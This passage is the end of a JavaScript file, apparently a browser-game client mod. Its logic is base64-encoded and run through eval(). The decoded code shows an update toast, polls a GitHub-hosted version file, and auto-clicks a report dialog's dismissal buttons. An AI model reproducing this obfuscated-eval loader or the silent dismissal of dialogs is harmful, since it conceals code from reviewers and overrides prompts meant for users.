CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB9LCA1NTAwKTsKICAgIHNlbmRGZGVidWcoKTsKCiAgfQogIAoKLy9UaGUgVXBkYXRlIHRvYXN0CmZ1bmN0aW9uIHNob3dUb2FzdFVwZGF0ZSgpIHsKLy8gQ3JlYXRlIHRoZSB0b2FzdCBjb250YWluZXIKdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgI2YyMmMyYyI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwp0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CnN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CnN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CnN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CgovLyBVcGRhdGUgdGhlIHdpZHRoIG9mIHRoZSBzdGF0dXMgYmFyIHdoaWxlIGNvdW50aW5nIGRvd24Kc2V0VGltZW91dChmdW5jdGlvbigpIHsKICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7Cn0sIDApOwoKdmFyIGNsb3NlQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CmNsb3NlQnV0dG9uLnN0eWxlLmJvcmRlciA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUuYmFja2dyb3VuZCA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUudG9wID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLnJpZ2h0ID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRTaXplID0gIjE2cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5MZWZ0ID0gIi0ycHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICIwcHgiOwpjbG9zZUJ1dHRvbi5pbm5lckhUTUwgPSAiWCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGNsb3NlQnV0dG9uKTsKCi8vIENsb3NlIHRvYXN0IHdoZW4gY2xvc2UgYnV0dG9uIGlzIGNsaWNrZWQKY2xvc2VCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogIH0sIDUwMCk7Cn0pOwoKLy8gQkNNRSBsb2dvIHRoZSBsZWZ0CnZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7Cmljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7Cmljb24uc3R5bGUud2lkdGggPSAiMjNweCI7Cmljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwppY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwppY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwoKLy8gVXBkYXRlIGNsaWVudCBtZXNzYWdlCnZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwp0ZXh0LnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CnRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKdGV4dC5pbm5lckhUTUwgPSAiTmV3IHVwZGF0ZSBkZXRlY3RlZCwgcmVmcmVzaCBCQyB0byB1cGRhdGUgdG8gVjIuMC43IjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7Cgpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0Q29udGFpbmVyKTsKCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKfSwgMCk7CgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7Cn0sIDUwMDAwMDApOwoKc2V0VGltZW91dChmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwp9LCA1NTAwMDAwKTsKCn0KCiAgLy8gRW5kIG9mIFVwZGF0ZSBNYW5lZ3JlIFRvYXN0X19fX19fX19fX19fX19fXwoKICBjb25zdCBlbGVtZW50VG9SZW1vdmUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXZbc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgaW5zZXQ6IDUlOyBiYWNrZ3JvdW5kOiB3aGl0ZTsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgcGFkZGluZzogMWVtOyJdJyk7CgogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgY29uc3QgZWxlbWVudFRvUmVtb3ZlID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignZGl2W3N0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IGluc2V0OiA1JTsgYmFja2dyb3VuZDogd2hpdGU7IGRpc3BsYXk6IGZsZXg7IGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47IHBhZGRpbmc6IDFlbTsiXScpOwogICAgaWYgKGVsZW1lbnRUb1JlbW92ZSkgewogICAgICBjb25zdCBidXR0b25zID0gZWxlbWVudFRvUmVtb3ZlLnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbltzdHlsZT0iY3Vyc29yOiBwb2ludGVyOyJdJyk7CiAgICAgIGlmIChidXR0b25zKSB7CiAgICAgICAgYnV0dG9ucy5mb3JFYWNoKGJ1dHRvbiA9PiBidXR0b24uY2xpY2soKSk7CiAgICAgIH0KICAgIH0KICB9LCAxKTsKICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGNvbnN0IGVsZW1lbnRUb1JlbW92ZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2RpdltzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyBpbnNldDogNSU7IGJhY2tncm91bmQ6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBwYWRkaW5nOiAxZW07Il0nKTsKICAgIGlmIChlbGVtZW50VG9SZW1vdmUpIHsKICAgICAgY29uc3QgYnV0dG9ucyA9IGVsZW1lbnRUb1JlbW92ZS5xdWVyeVNlbGVjdG9yQWxsKCdidXR0b25bc3R5bGU9ImN1cnNvcjogcG9pbnRlcjsiXScpOwogICAgICBpZiAoYnV0dG9ucykgewogICAgICAgIGJ1dHRvbnMuZm9yRWFjaChidXR0b24gPT4gewogICAgICAgICAgaWYgKGJ1dHRvbi50ZXh0Q29udGVudCA9PT0gIkRvIG5vdCBzaG93IHRoaXMgcmVwb3J0IGFnYWluIHVubGVzcyBzb21ldGhpbmcgY2hhbmdlcyIgfHwgYnV0dG9uLnRleHRDb250ZW50ID09PSAiQ2xvc2UiKSB7CiAgICAgICAgICAgIGJ1dHRvbi5jbGljaygpOwogICAgICAgICAgfQogICAgICAgIH0pOwogICAgICB9CiAgICB9CiAgfSwgNTAwKTsKCiAgLy8gIFVSTCBvZiB0aGUgdXBkYXRlIHBhZ2UKY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQ01TNy9CQ00vbWFpbi91cGRhdGVtYW5hZ2VyLmpzJzsKY29uc3QgbWF4VmVyc2lvbiA9IDE1OwpsZXQgYWxlcnRUcmlnZ2VyZWQgPSBmYWxzZTsKZnVuY3Rpb24gY2hlY2tWZXJzaW9uKCkgewogIGZldGNoKHVybCkKICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAgIC50aGVuKHZlcnNpb24gPT4gewogICAgICBpZiAocGFyc2VJbnQodmVyc2lvbikgPiBtYXhWZXJzaW9uICYmICFhbGVydFRyaWdnZXJlZCkgewogICAgICAgIHNob3dUb2FzdFVwZGF0ZSgpOwogICAgICAgIGFsZXJ0VHJpZ2dlcmVkID0gdHJ1ZTsKICAgICAgfQogICAgfSkKICAgIC5jYXRjaChlcnJvciA9PiBjb25zb2xlLmVycm9yKGVycm9yKSk7Cn0KLy8gQ2hlY2sgZm9yIHVwZGF0ZXMgZXZlcnkgNSBzZWNvbmRzCnNldEludGVydmFsKGNoZWNrVmVyc2lvbiwgNTAwMCk7Cn0KfSkKCgo=')
if (sprc) {
eval(sprc);
}
/*
36
*/
